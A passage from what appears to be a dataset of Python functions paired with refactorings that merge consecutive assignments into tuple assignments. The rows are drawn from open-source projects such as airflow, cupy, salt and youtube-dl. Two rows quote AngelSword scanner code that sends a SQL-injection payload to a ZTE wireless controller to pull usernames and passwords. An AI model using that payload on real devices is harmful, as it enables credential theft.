            sub_domain_list, query = google_hack.search_domain(domain, max_search_num=self.max_search_num)
            sub_domain_list.append(domain)
            sub_domain_list.append('www.' + domain)
            for sub_idx, sub_domain in enumerate(list(set(sub_domain_list))):
                self.utility.print_message(OK, 'Search ""{}""'.format(sub_domain))
                # Get DNS record and IP address of sub-domain.
                sub_domain_info = self.get_sub_domain_dns_record(sub_domain)
                sub_domain_info_dict[sub_domain] = sub_domain_info

            # Add sub-domain information to domain dict.
            domain_info_dict[domain]['Sub-domain'] = sub_domain_info_dict
            domain_info_dict[domain]['Note'] = query

            # Save domain information to temporary json file.
            with codecs.open(os.path.join(self.tmp_inventory_dir, domain), 'w', 'utf-8') as fout:
                json.dump(domain_info_dict[domain], fout, indent=4)","domain_info_dict[domain]['Sub-domain'] = sub_domain_info_dict
domain_info_dict[domain]['Note'] = query","domain_info_dict[domain]['Sub-domain'] , domain_info_dict[domain]['Note']  = sub_domain_info_dict, query"
POT,https://github.com/PythonOT/POT/tree/master/ot/smooth.py,,dual_obj_grad$211,"def dual_obj_grad(alpha, beta, a, b, C, regul):
    r""""""
    Compute objective value and gradients of dual objective.

    Parameters
    ----------
    alpha: array, shape = len(a)
    beta: array, shape = len(b)
        Current iterate of dual potentials.
    a: array, shape = len(a)
    b: array, shape = len(b)
        Input histograms (should be non-negative and sum to 1).
    C: array, shape = (len(a), len(b))
        Ground cost matrix.
    regul: Regularization object
        Should implement a `delta_Omega(X)` method.

    Returns
    -------
    obj: float
        Objective value (higher is better).
    grad_alpha: array, shape = len(a)
        Gradient w.r.t. `alpha`.
    grad_beta: array, shape = len(b)
        Gradient w.r.t. `beta`.
    """"""
    obj = np.dot(alpha, a) + np.dot(beta, b)
    grad_alpha = a.copy()
    grad_beta = b.copy()

    # X[:, j] = alpha + beta[j] - C[:, j]
    X = alpha[:, np.newaxis] + beta - C

    # val.shape = len(b)
    # G.shape = len(a) x len(b)
    val, G = regul.delta_Omega(X)

    obj -= np.sum(val)
    grad_alpha -= G.sum(axis=1)
    grad_beta -= G.sum(axis=0)

    return obj, grad_alpha, grad_beta","obj = np.dot(alpha, a) + np.dot(beta, b)
grad_alpha = a.copy()
grad_beta = b.copy()
X = alpha[:, np.newaxis] + beta - C","obj , grad_alpha , grad_beta , X  = np.dot(alpha, a) + np.dot(beta, b), a.copy(), b.copy(), alpha[:, np.newaxis] + beta - C"
airflow,https://github.com/apache/airflow/tree/master/tests/providers/amazon/aws/operators/test_sagemaker_endpoint.py,TestSageMakerEndpointOperator,test_execute_with_duplicate_endpoint_creation$110,"def test_execute_with_duplicate_endpoint_creation(
        self, mock_endpoint_update, mock_endpoint, mock_endpoint_config, mock_model, mock_client
    ):
        response = {
            ""Error"": {""Code"": ""ValidationException"", ""Message"": ""Cannot create already existing endpoint.""}
        }
        mock_endpoint.side_effect = ClientError(error_response=response, operation_name=""CreateEndpoint"")
        mock_endpoint_update.return_value = {
            'EndpointArn': 'testarn',
            'ResponseMetadata': {'HTTPStatusCode': 200},
        }
        self.sagemaker.execute(None)","mock_endpoint.side_effect = ClientError(error_response=response, operation_name='CreateEndpoint')
mock_endpoint_update.return_value = {'EndpointArn': 'testarn', 'ResponseMetadata': {'HTTPStatusCode': 200}}","mock_endpoint.side_effect , mock_endpoint_update.return_value  = ClientError(error_response=response, operation_name='CreateEndpoint'), {'EndpointArn': 'testarn', 'ResponseMetadata': {'HTTPStatusCode': 200}}"
holoviews,https://github.com/holoviz/holoviews/tree/master/holoviews/plotting/bokeh/callbacks.py,Callback,resolve_attr_spec$228,"def resolve_attr_spec(cls, spec, cb_obj, model=None):
        """"""
        Resolves a Callback attribute specification looking the
        corresponding attribute up on the cb_obj, which should be a
        bokeh model. If not model is supplied cb_obj is assumed to
        be the same as the model.
        """"""
        if not cb_obj:
            raise Exception('Bokeh plot attribute %s could not be found' % spec)
        if model is None:
            model = cb_obj
        spec = spec.split('.')
        resolved = cb_obj
        for p in spec[1:]:
            if p == 'attributes':
                continue
            if isinstance(resolved, dict):
                resolved = resolved.get(p)
            else:
                resolved = getattr(resolved, p, None)
        return {'id': model.ref['id'], 'value': resolved}","spec = spec.split('.')
resolved = cb_obj","spec , resolved  = spec.split('.'), cb_obj"
cupy,https://github.com/cupy/cupy/tree/master/tests/cupy_tests/fft_tests/test_cache.py,TestPlanCache,test_LRU_cache6$201,"def test_LRU_cache6(self):
        # test if each device has a separate cache
        cache0 = self.caches[0]
        cache1 = self.caches[1]

        # ensure a fresh state
        assert cache0.get_curr_size() == 0 <= cache0.get_size()
        assert cache1.get_curr_size() == 0 <= cache1.get_size()

        # do some computation on GPU 0
        with device.Device(0):
            a = testing.shaped_random((10,), cupy, cupy.float32)
            cupy.fft.fft(a)
        assert cache0.get_curr_size() == 1 <= cache0.get_size()
        assert cache1.get_curr_size() == 0 <= cache1.get_size()

        # do some computation on GPU 1
        with device.Device(1):
            c = testing.shaped_random((16,), cupy, cupy.float64)
            cupy.fft.fft(c)
        assert cache0.get_curr_size() == 1 <= cache0.get_size()
        assert cache1.get_curr_size() == 1 <= cache1.get_size()

        # reset device 0
        cache0.clear()
        assert cache0.get_curr_size() == 0 <= cache0.get_size()
        assert cache1.get_curr_size() == 1 <= cache1.get_size()

        # reset device 1
        cache1.clear()
        assert cache0.get_curr_size() == 0 <= cache0.get_size()
        assert cache1.get_curr_size() == 0 <= cache1.get_size()","cache0 = self.caches[0]
cache1 = self.caches[1]","cache0 , cache1  = self.caches[0], self.caches[1]"
devpi,https://github.com/devpi/devpi/tree/master/client/testing/test_use.py,TestUnit,test_auth_multisite$253,"def test_auth_multisite(self):
        current = Current()
        login1 = ""http://site.com/+login""
        login2 = ""http://site2.com/+login""
        current.login = login1
        current.set_auth(""hello"", ""pass1"")
        current.login = login2
        current.set_auth(""hello"", ""pass2"")
        assert current.get_auth(login1) == (""hello"", ""pass1"")
        assert current.get_auth(login2) == (""hello"", ""pass2"")
        current.login = login1
        current.del_auth()
        assert not current.get_auth(login1)
        assert current.get_auth(login2) == (""hello"", ""pass2"")
        current.login = login2
        current.del_auth()
        assert not current.get_auth(login2)","login2 = 'http://site2.com/+login'
current.login = login1","login2 , current.login  = 'http://site2.com/+login', login1"
data-driven-web-apps-with-flask,https://github.com/talkpython/data-driven-web-apps-with-flask/tree/master/app/ch11_migrations/starter/pypi_org/bin/load_data.py,,build_releases$303,"def build_releases(package_id: str, releases: dict) -> List[Release]:
    db_releases = []
    for k in releases.keys():
        all_releases_for_version = releases.get(k)
        if not all_releases_for_version:
            continue

        v = all_releases_for_version[-1]

        r = Release()
        r.package_id = package_id
        r.major_ver, r.minor_ver, r.build_ver = make_version_num(k)
        r.created_date = parse(v.get('upload_time'))
        r.comment = v.get('comment_text')
        r.url = v.get('url')
        r.size = int(v.get('size', 0))

        db_releases.append(r)

    return db_releases","v = all_releases_for_version[-1]
r = Release()","v , r  = all_releases_for_version[-1], Release()"
data-driven-web-apps-with-flask,https://github.com/talkpython/data-driven-web-apps-with-flask/tree/master/app/ch11_migrations/starter/pypi_org/bin/load_data.py,,build_releases$303,"def build_releases(package_id: str, releases: dict) -> List[Release]:
    db_releases = []
    for k in releases.keys():
        all_releases_for_version = releases.get(k)
        if not all_releases_for_version:
            continue

        v = all_releases_for_version[-1]

        r = Release()
        r.package_id = package_id
        r.major_ver, r.minor_ver, r.build_ver = make_version_num(k)
        r.created_date = parse(v.get('upload_time'))
        r.comment = v.get('comment_text')
        r.url = v.get('url')
        r.size = int(v.get('size', 0))

        db_releases.append(r)

    return db_releases","r.created_date = parse(v.get('upload_time'))
r.comment = v.get('comment_text')
r.url = v.get('url')
r.size = int(v.get('size', 0))","r.created_date , r.comment , r.url , r.size  = parse(v.get('upload_time')), v.get('comment_text'), v.get('url'), int(v.get('size', 0))"
not-youtube-dl,https://github.com/scastillo/not-youtube-dl/tree/master/youtube_dl/extractor/cspan.py,CSpanIE,_real_extract$79,"def _real_extract(self, url):
        video_id = self._match_id(url)
        video_type = None
        webpage = self._download_webpage(url, video_id)

        ustream_url = UstreamIE._extract_url(webpage)
        if ustream_url:
            return self.url_result(ustream_url, UstreamIE.ie_key())

        if '&vod' not in url:
            bc = self._search_regex(
                r""(<[^>]+id='brightcove-player-embed'[^>]+>)"",
                webpage, 'brightcove embed', default=None)
            if bc:
                bc_attr = extract_attributes(bc)
                bc_url = self.BRIGHTCOVE_URL_TEMPLATE % (
                    bc_attr.get('data-bcaccountid', '3162030207001'),
                    bc_attr.get('data-noprebcplayerid', 'SyGGpuJy3g'),
                    bc_attr.get('data-newbcplayerid', 'default'),
                    bc_attr['data-bcid'])
                return self.url_result(smuggle_url(bc_url, {'source_url': url}))

        # We first look for clipid, because clipprog always appears before
        patterns = [r'id=\'clip(%s)\'\s*value=\'([0-9]+)\'' % t for t in ('id', 'prog')]
        results = list(filter(None, (re.search(p, webpage) for p in patterns)))
        if results:
            matches = results[0]
            video_type, video_id = matches.groups()
            video_type = 'clip' if video_type == 'id' else 'program'
        else:
            m = re.search(r'data-(?P<type>clip|prog)id=[""\'](?P<id>\d+)', webpage)
            if m:
                video_id = m.group('id')
                video_type = 'program' if m.group('type') == 'prog' else 'clip'
            else:
                senate_isvp_url = SenateISVPIE._search_iframe_url(webpage)
                if senate_isvp_url:
                    title = self._og_search_title(webpage)
                    surl = smuggle_url(senate_isvp_url, {'force_title': title})
                    return self.url_result(surl, 'SenateISVP', video_id, title)
                video_id = self._search_regex(
                    r'jwsetup\.clipprog\s*=\s*(\d+);',
                    webpage, 'jwsetup program id', default=None)
                if video_id:
                    video_type = 'program'
        if video_type is None or video_id is None:
            error_message = get_element_by_class('VLplayer-error-message', webpage)
            if error_message:
                raise ExtractorError(error_message)
            raise ExtractorError('unable to find video id and type')

        def get_text_attr(d, attr):
            return d.get(attr, {}).get('#text')

        data = self._download_json(
            'http://www.c-span.org/assets/player/ajax-player.php?os=android&html5=%s&id=%s' % (video_type, video_id),
            video_id)['video']
        if data['@status'] != 'Success':
            raise ExtractorError('%s said: %s' % (self.IE_NAME, get_text_attr(data, 'error')), expected=True)

        doc = self._download_xml(
            'http://www.c-span.org/common/services/flashXml.php?%sid=%s' % (video_type, video_id),
            video_id)

        description = self._html_search_meta('description', webpage)

        title = find_xpath_attr(doc, './/string', 'name', 'title').text
        thumbnail = find_xpath_attr(doc, './/string', 'name', 'poster').text

        files = data['files']
        capfile = get_text_attr(data, 'capfile')

        entries = []
        for partnum, f in enumerate(files):
            formats = []
            for quality in f.get('qualities', []):
                formats.append({
                    'format_id': '%s-%sp' % (get_text_attr(quality, 'bitrate'), get_text_attr(quality, 'height')),
                    'url': unescapeHTML(get_text_attr(quality, 'file')),
                    'height': int_or_none(get_text_attr(quality, 'height')),
                    'tbr': int_or_none(get_text_attr(quality, 'bitrate')),
                })
            if not formats:
                path = unescapeHTML(get_text_attr(f, 'path'))
                if not path:
                    continue
                formats = self._extract_m3u8_formats(
                    path, video_id, 'mp4', entry_protocol='m3u8_native',
                    m3u8_id='hls') if determine_ext(path) == 'm3u8' else [{'url': path, }]
            self._sort_formats(formats)
            entries.append({
                'id': '%s_%d' % (video_id, partnum + 1),
                'title': (
                    title if len(files) == 1 else
                    '%s part %d' % (title, partnum + 1)),
                'formats': formats,
                'description': description,
                'thumbnail': thumbnail,
                'duration': int_or_none(get_text_attr(f, 'length')),
                'subtitles': {
                    'en': [{
                        'url': capfile,
                        'ext': determine_ext(capfile, 'dfxp')
                    }],
                } if capfile else None,
            })

        if len(entries) == 1:
            entry = dict(entries[0])
            entry['id'] = 'c' + video_id if video_type == 'clip' else video_id
            return entry
        else:
            return {
                '_type': 'playlist',
                'entries': entries,
                'title': title,
                'id': 'c' + video_id if video_type == 'clip' else video_id,
            }","video_type = None
webpage = self._download_webpage(url, video_id)","video_type , webpage  = None, self._download_webpage(url, video_id)"
not-youtube-dl,https://github.com/scastillo/not-youtube-dl/tree/master/youtube_dl/extractor/cspan.py,CSpanIE,_real_extract$79,"def _real_extract(self, url):
        video_id = self._match_id(url)
        video_type = None
        webpage = self._download_webpage(url, video_id)

        ustream_url = UstreamIE._extract_url(webpage)
        if ustream_url:
            return self.url_result(ustream_url, UstreamIE.ie_key())

        if '&vod' not in url:
            bc = self._search_regex(
                r""(<[^>]+id='brightcove-player-embed'[^>]+>)"",
                webpage, 'brightcove embed', default=None)
            if bc:
                bc_attr = extract_attributes(bc)
                bc_url = self.BRIGHTCOVE_URL_TEMPLATE % (
                    bc_attr.get('data-bcaccountid', '3162030207001'),
                    bc_attr.get('data-noprebcplayerid', 'SyGGpuJy3g'),
                    bc_attr.get('data-newbcplayerid', 'default'),
                    bc_attr['data-bcid'])
                return self.url_result(smuggle_url(bc_url, {'source_url': url}))

        # We first look for clipid, because clipprog always appears before
        patterns = [r'id=\'clip(%s)\'\s*value=\'([0-9]+)\'' % t for t in ('id', 'prog')]
        results = list(filter(None, (re.search(p, webpage) for p in patterns)))
        if results:
            matches = results[0]
            video_type, video_id = matches.groups()
            video_type = 'clip' if video_type == 'id' else 'program'
        else:
            m = re.search(r'data-(?P<type>clip|prog)id=[""\'](?P<id>\d+)', webpage)
            if m:
                video_id = m.group('id')
                video_type = 'program' if m.group('type') == 'prog' else 'clip'
            else:
                senate_isvp_url = SenateISVPIE._search_iframe_url(webpage)
                if senate_isvp_url:
                    title = self._og_search_title(webpage)
                    surl = smuggle_url(senate_isvp_url, {'force_title': title})
                    return self.url_result(surl, 'SenateISVP', video_id, title)
                video_id = self._search_regex(
                    r'jwsetup\.clipprog\s*=\s*(\d+);',
                    webpage, 'jwsetup program id', default=None)
                if video_id:
                    video_type = 'program'
        if video_type is None or video_id is None:
            error_message = get_element_by_class('VLplayer-error-message', webpage)
            if error_message:
                raise ExtractorError(error_message)
            raise ExtractorError('unable to find video id and type')

        def get_text_attr(d, attr):
            return d.get(attr, {}).get('#text')

        data = self._download_json(
            'http://www.c-span.org/assets/player/ajax-player.php?os=android&html5=%s&id=%s' % (video_type, video_id),
            video_id)['video']
        if data['@status'] != 'Success':
            raise ExtractorError('%s said: %s' % (self.IE_NAME, get_text_attr(data, 'error')), expected=True)

        doc = self._download_xml(
            'http://www.c-span.org/common/services/flashXml.php?%sid=%s' % (video_type, video_id),
            video_id)

        description = self._html_search_meta('description', webpage)

        title = find_xpath_attr(doc, './/string', 'name', 'title').text
        thumbnail = find_xpath_attr(doc, './/string', 'name', 'poster').text

        files = data['files']
        capfile = get_text_attr(data, 'capfile')

        entries = []
        for partnum, f in enumerate(files):
            formats = []
            for quality in f.get('qualities', []):
                formats.append({
                    'format_id': '%s-%sp' % (get_text_attr(quality, 'bitrate'), get_text_attr(quality, 'height')),
                    'url': unescapeHTML(get_text_attr(quality, 'file')),
                    'height': int_or_none(get_text_attr(quality, 'height')),
                    'tbr': int_or_none(get_text_attr(quality, 'bitrate')),
                })
            if not formats:
                path = unescapeHTML(get_text_attr(f, 'path'))
                if not path:
                    continue
                formats = self._extract_m3u8_formats(
                    path, video_id, 'mp4', entry_protocol='m3u8_native',
                    m3u8_id='hls') if determine_ext(path) == 'm3u8' else [{'url': path, }]
            self._sort_formats(formats)
            entries.append({
                'id': '%s_%d' % (video_id, partnum + 1),
                'title': (
                    title if len(files) == 1 else
                    '%s part %d' % (title, partnum + 1)),
                'formats': formats,
                'description': description,
                'thumbnail': thumbnail,
                'duration': int_or_none(get_text_attr(f, 'length')),
                'subtitles': {
                    'en': [{
                        'url': capfile,
                        'ext': determine_ext(capfile, 'dfxp')
                    }],
                } if capfile else None,
            })

        if len(entries) == 1:
            entry = dict(entries[0])
            entry['id'] = 'c' + video_id if video_type == 'clip' else video_id
            return entry
        else:
            return {
                '_type': 'playlist',
                'entries': entries,
                'title': title,
                'id': 'c' + video_id if video_type == 'clip' else video_id,
            }","description = self._html_search_meta('description', webpage)
title = find_xpath_attr(doc, './/string', 'name', 'title').text
thumbnail = find_xpath_attr(doc, './/string', 'name', 'poster').text
files = data['files']
capfile = get_text_attr(data, 'capfile')
entries = []","description , title , thumbnail , files , capfile , entries  = self._html_search_meta('description', webpage), find_xpath_attr(doc, './/string', 'name', 'title').text, find_xpath_attr(doc, './/string', 'name', 'poster').text, data['files'], get_text_attr(data, 'capfile'), []"
not-youtube-dl,https://github.com/scastillo/not-youtube-dl/tree/master/youtube_dl/extractor/cspan.py,CSpanIE,_real_extract$79,"def _real_extract(self, url):
        video_id = self._match_id(url)
        video_type = None
        webpage = self._download_webpage(url, video_id)

        ustream_url = UstreamIE._extract_url(webpage)
        if ustream_url:
            return self.url_result(ustream_url, UstreamIE.ie_key())

        if '&vod' not in url:
            bc = self._search_regex(
                r""(<[^>]+id='brightcove-player-embed'[^>]+>)"",
                webpage, 'brightcove embed', default=None)
            if bc:
                bc_attr = extract_attributes(bc)
                bc_url = self.BRIGHTCOVE_URL_TEMPLATE % (
                    bc_attr.get('data-bcaccountid', '3162030207001'),
                    bc_attr.get('data-noprebcplayerid', 'SyGGpuJy3g'),
                    bc_attr.get('data-newbcplayerid', 'default'),
                    bc_attr['data-bcid'])
                return self.url_result(smuggle_url(bc_url, {'source_url': url}))

        # We first look for clipid, because clipprog always appears before
        patterns = [r'id=\'clip(%s)\'\s*value=\'([0-9]+)\'' % t for t in ('id', 'prog')]
        results = list(filter(None, (re.search(p, webpage) for p in patterns)))
        if results:
            matches = results[0]
            video_type, video_id = matches.groups()
            video_type = 'clip' if video_type == 'id' else 'program'
        else:
            m = re.search(r'data-(?P<type>clip|prog)id=[""\'](?P<id>\d+)', webpage)
            if m:
                video_id = m.group('id')
                video_type = 'program' if m.group('type') == 'prog' else 'clip'
            else:
                senate_isvp_url = SenateISVPIE._search_iframe_url(webpage)
                if senate_isvp_url:
                    title = self._og_search_title(webpage)
                    surl = smuggle_url(senate_isvp_url, {'force_title': title})
                    return self.url_result(surl, 'SenateISVP', video_id, title)
                video_id = self._search_regex(
                    r'jwsetup\.clipprog\s*=\s*(\d+);',
                    webpage, 'jwsetup program id', default=None)
                if video_id:
                    video_type = 'program'
        if video_type is None or video_id is None:
            error_message = get_element_by_class('VLplayer-error-message', webpage)
            if error_message:
                raise ExtractorError(error_message)
            raise ExtractorError('unable to find video id and type')

        def get_text_attr(d, attr):
            return d.get(attr, {}).get('#text')

        data = self._download_json(
            'http://www.c-span.org/assets/player/ajax-player.php?os=android&html5=%s&id=%s' % (video_type, video_id),
            video_id)['video']
        if data['@status'] != 'Success':
            raise ExtractorError('%s said: %s' % (self.IE_NAME, get_text_attr(data, 'error')), expected=True)

        doc = self._download_xml(
            'http://www.c-span.org/common/services/flashXml.php?%sid=%s' % (video_type, video_id),
            video_id)

        description = self._html_search_meta('description', webpage)

        title = find_xpath_attr(doc, './/string', 'name', 'title').text
        thumbnail = find_xpath_attr(doc, './/string', 'name', 'poster').text

        files = data['files']
        capfile = get_text_attr(data, 'capfile')

        entries = []
        for partnum, f in enumerate(files):
            formats = []
            for quality in f.get('qualities', []):
                formats.append({
                    'format_id': '%s-%sp' % (get_text_attr(quality, 'bitrate'), get_text_attr(quality, 'height')),
                    'url': unescapeHTML(get_text_attr(quality, 'file')),
                    'height': int_or_none(get_text_attr(quality, 'height')),
                    'tbr': int_or_none(get_text_attr(quality, 'bitrate')),
                })
            if not formats:
                path = unescapeHTML(get_text_attr(f, 'path'))
                if not path:
                    continue
                formats = self._extract_m3u8_formats(
                    path, video_id, 'mp4', entry_protocol='m3u8_native',
                    m3u8_id='hls') if determine_ext(path) == 'm3u8' else [{'url': path, }]
            self._sort_formats(formats)
            entries.append({
                'id': '%s_%d' % (video_id, partnum + 1),
                'title': (
                    title if len(files) == 1 else
                    '%s part %d' % (title, partnum + 1)),
                'formats': formats,
                'description': description,
                'thumbnail': thumbnail,
                'duration': int_or_none(get_text_attr(f, 'length')),
                'subtitles': {
                    'en': [{
                        'url': capfile,
                        'ext': determine_ext(capfile, 'dfxp')
                    }],
                } if capfile else None,
            })

        if len(entries) == 1:
            entry = dict(entries[0])
            entry['id'] = 'c' + video_id if video_type == 'clip' else video_id
            return entry
        else:
            return {
                '_type': 'playlist',
                'entries': entries,
                'title': title,
                'id': 'c' + video_id if video_type == 'clip' else video_id,
            }","video_id = m.group('id')
video_type = 'program' if m.group('type') == 'prog' else 'clip'","video_id , video_type  = m.group('id'), 'program' if m.group('type') == 'prog' else 'clip'"
AngelSword,https://github.com/Lucifer1993/AngelSword/tree/master/industrial/zte_wireless_getChannelByCountryCode_sqli.py,zte_wireless_getChannelByCountryCode_sqli_BaseVerify,run$19,"def run(self):
        headers = {
            ""User-Agent"":""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50""
        }
        payload = ""/apgroup/getChannelByCountryCode.php""
        vulnurl = self.url + payload
        post_data = {
            ""CountryCode"":""'UniOn SeLect UserName || '~~~'  || PassWord From LoginAccount--""
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r""~~~"" in req.text:
                cprint(""[+]存在zte 无线控制器 SQL注入漏洞...(高危)\tpayload: ""+vulnurl+""\npost: ""+json.dumps(post_data, indent=4), ""red"")
            else:
                cprint(""[-]不存在zte_wireless_getChannelByCountryCode_sqli漏洞"", ""white"", ""on_grey"")

        except:
            cprint(""[-] ""+__file__+""====>可能不存在漏洞"", ""cyan"")","headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}
payload = '/apgroup/getChannelByCountryCode.php'","headers , payload  = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}, '/apgroup/getChannelByCountryCode.php'"
AngelSword,https://github.com/Lucifer1993/AngelSword/tree/master/industrial/zte_wireless_getChannelByCountryCode_sqli.py,zte_wireless_getChannelByCountryCode_sqli_BaseVerify,run$19,"def run(self):
        headers = {
            ""User-Agent"":""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50""
        }
        payload = ""/apgroup/getChannelByCountryCode.php""
        vulnurl = self.url + payload
        post_data = {
            ""CountryCode"":""'UniOn SeLect UserName || '~~~'  || PassWord From LoginAccount--""
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r""~~~"" in req.text:
                cprint(""[+]存在zte 无线控制器 SQL注入漏洞...(高危)\tpayload: ""+vulnurl+""\npost: ""+json.dumps(post_data, indent=4), ""red"")
            else:
                cprint(""[-]不存在zte_wireless_getChannelByCountryCode_sqli漏洞"", ""white"", ""on_grey"")

        except:
            cprint(""[-] ""+__file__+""====>可能不存在漏洞"", ""cyan"")","vulnurl = self.url + payload
post_data = {'CountryCode': ""'UniOn SeLect UserName || '~~~'  || PassWord From LoginAccount--""}","vulnurl , post_data  = self.url + payload, {'CountryCode': ""'UniOn SeLect UserName || '~~~'  || PassWord From LoginAccount--""}"
salt,https://github.com/saltstack/salt/tree/master/salt/states/keystone.py,,role_absent$581,"def role_absent(name, profile=None, **connection_args):
    """"""
    Ensure that the keystone role is absent.

    name
        The name of the role that should not exist
    """"""
    ret = {
        ""name"": name,
        ""changes"": {},
        ""result"": True,
        ""comment"": 'Role ""{}"" is already absent'.format(name),
    }

    # Check if role is present
    role = __salt__[""keystone.role_get""](name=name, profile=profile, **connection_args)
    if ""Error"" not in role:
        if __opts__.get(""test""):
            ret[""result""] = None
            ret[""comment""] = 'Role ""{}"" will be deleted'.format(name)
            return ret
        # Delete role
        __salt__[""keystone.role_delete""](name=name, profile=profile, **connection_args)
        ret[""comment""] = 'Role ""{}"" has been deleted'.format(name)
        ret[""changes""][""Role""] = ""Deleted""

    return ret","ret = {'name': name, 'changes': {}, 'result': True, 'comment': 'Role ""{}"" is already absent'.format(name)}
role = __salt__['keystone.role_get'](name=name, profile=profile, **connection_args)","ret , role  = {'name': name, 'changes': {}, 'result': True, 'comment': 'Role ""{}"" is already absent'.format(name)}, __salt__['keystone.role_get'](name=name, profile=profile, **connection_args)"
salt,https://github.com/saltstack/salt/tree/master/salt/states/keystone.py,,role_absent$581,"def role_absent(name, profile=None, **connection_args):
    """"""
    Ensure that the keystone role is absent.

    name
        The name of the role that should not exist
    """"""
    ret = {
        ""name"": name,
        ""changes"": {},
        ""result"": True,
        ""comment"": 'Role ""{}"" is already absent'.format(name),
    }

    # Check if role is present
    role = __salt__[""keystone.role_get""](name=name, profile=profile, **connection_args)
    if ""Error"" not in role:
        if __opts__.get(""test""):
            ret[""result""] = None
            ret[""comment""] = 'Role ""{}"" will be deleted'.format(name)
            return ret
        # Delete role
        __salt__[""keystone.role_delete""](name=name, profile=profile, **connection_args)
        ret[""comment""] = 'Role ""{}"" has been deleted'.format(name)
        ret[""changes""][""Role""] = ""Deleted""

    return ret","ret['comment'] = 'Role ""{}"" has been deleted'.format(name)
ret['changes']['Role'] = 'Deleted'","ret['comment'] , ret['changes']['Role']  = 'Role ""{}"" has been deleted'.format(name), 'Deleted'"
salt,https://github.com/saltstack/salt/tree/master/salt/states/keystone.py,,role_absent$581,"def role_absent(name, profile=None, **connection_args):
    """"""
    Ensure that the keystone role is absent.

    name
        The name of the role that should not exist
    """"""
    ret = {
        ""name"": name,
        ""changes"": {},
        ""result"": True,
        ""comment"": 'Role ""{}"" is already absent'.format(name),
    }

    # Check if role is present
    role = __salt__[""keystone.role_get""](name=name, profile=profile, **connection_args)
    if ""Error"" not in role:
        if __opts__.get(""test""):
            ret[""result""] = None
            ret[""comment""] = 'Role ""{}"" will be deleted'.format(name)
            return ret
        # Delete role
        __salt__[""keystone.role_delete""](name=name, profile=profile, **connection_args)
        ret[""comment""] = 'Role ""{}"" has been deleted'.format(name)
        ret[""changes""][""Role""] = ""Deleted""

    return ret","ret['result'] = None
ret['comment'] = 'Role ""{}"" will be deleted'.format(name)","ret['result'] , ret['comment']  = None, 'Role ""{}"" will be deleted'.format(name)"
PARL,https://github.com/PaddlePaddle/PARL/tree/master/examples/NeurIPS2018-AI-for-Prosthetics-Challenge/opensim_model.py,ActorModel,__init__$39,"def __init__(self, obs_dim, vel_obs_dim, act_dim, model_id, shared):
        hid0_size = 800
        hid1_size = 400
        hid2_size = 200
        vel_hid0_size = 200
        vel_hid1_size = 400

        self.obs_dim = obs_dim
        self.vel_obs_dim = vel_obs_dim

        # bottom layers
        if shared:
            scope_name = 'policy_shared'
        else:
            scope_name = 'policy_identity_{}'.format(model_id)

        self.fc0 = layers.fc(
            size=hid0_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h0/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h0/b'.format(scope_name)))
        self.fc1 = layers.fc(
            size=hid1_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h1/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h1/b'.format(scope_name)))
        self.vel_fc0 = layers.fc(
            size=vel_hid0_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/vel_h0/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/vel_h0/b'.format(scope_name)))
        self.vel_fc1 = layers.fc(
            size=vel_hid1_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/vel_h1/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/vel_h1/b'.format(scope_name)))

        # top layers
        scope_name = 'policy_identity_{}'.format(model_id)

        self.fc2 = layers.fc(
            size=hid2_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h2/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h2/b'.format(scope_name)))
        self.fc3 = layers.fc(
            size=act_dim,
            act='tanh',
            param_attr=ParamAttr(name='{}/means/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/means/b'.format(scope_name)))","hid0_size = 800
hid1_size = 400
hid2_size = 200
vel_hid0_size = 200
vel_hid1_size = 400
self.obs_dim = obs_dim
self.vel_obs_dim = vel_obs_dim","hid0_size , hid1_size , hid2_size , vel_hid0_size , vel_hid1_size , self.obs_dim , self.vel_obs_dim  = 800, 400, 200, 200, 400, obs_dim, vel_obs_dim"
PARL,https://github.com/PaddlePaddle/PARL/tree/master/examples/NeurIPS2018-AI-for-Prosthetics-Challenge/opensim_model.py,ActorModel,__init__$39,"def __init__(self, obs_dim, vel_obs_dim, act_dim, model_id, shared):
        hid0_size = 800
        hid1_size = 400
        hid2_size = 200
        vel_hid0_size = 200
        vel_hid1_size = 400

        self.obs_dim = obs_dim
        self.vel_obs_dim = vel_obs_dim

        # bottom layers
        if shared:
            scope_name = 'policy_shared'
        else:
            scope_name = 'policy_identity_{}'.format(model_id)

        self.fc0 = layers.fc(
            size=hid0_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h0/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h0/b'.format(scope_name)))
        self.fc1 = layers.fc(
            size=hid1_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h1/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h1/b'.format(scope_name)))
        self.vel_fc0 = layers.fc(
            size=vel_hid0_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/vel_h0/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/vel_h0/b'.format(scope_name)))
        self.vel_fc1 = layers.fc(
            size=vel_hid1_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/vel_h1/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/vel_h1/b'.format(scope_name)))

        # top layers
        scope_name = 'policy_identity_{}'.format(model_id)

        self.fc2 = layers.fc(
